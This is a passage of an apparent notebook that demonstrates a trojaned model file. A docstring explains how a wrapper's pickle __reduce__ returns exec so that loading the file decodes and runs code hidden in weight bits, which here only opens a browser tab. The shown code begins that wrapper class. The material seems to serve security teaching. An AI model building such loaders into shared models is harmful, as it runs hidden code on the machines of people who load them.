    "\"\"\"\n",
    "TrojanModelWrapper exploits pickle's __reduce__ method. Instead of returning instructions\n",
    "to reconstruct a harmless object, __reduce__ returns (exec, (loader_code,)), telling the\n",
    "unpickler to run a crafted string during deserialization. That string bundles the entire\n",
    "pickled state_dict, the target key, the LSB parameter, and a copy of decode_lsb. When exec\n",
    "runs during unpickling, it reconstructs the state_dict, extracts the payload tensor,\n",
    "decodes the hidden bytes, and executes them (here: opening a browser tab).\n",
    "\"\"\"\n",
    "import pickle\n",
    "\n",
    "\n",
    "class TrojanModelWrapper:\n",
    "    \"\"\"A wrapper class that hijacks pickle deserialization to run embedded code.\"\"\"\n",
    "\n",
    "    def __init__(self, modified_state_dict: dict, target_key: str, num_lsb: int):\n",
    "        print(\n",
    "            f\"  [Wrapper Init] Received modified state_dict with {len(modified_state_dict)} keys.\"\n",
    "        )\n",
    "        print(f\"  [Wrapper Init] Received target_key: '{target_key}'\")\n",
    "        print(f\"  [Wrapper Init] Received num_lsb: {num_lsb}\")\n",
    "\n",
    "        if target_key not in modified_state_dict:\n",
    "            raise ValueError(\n",
    "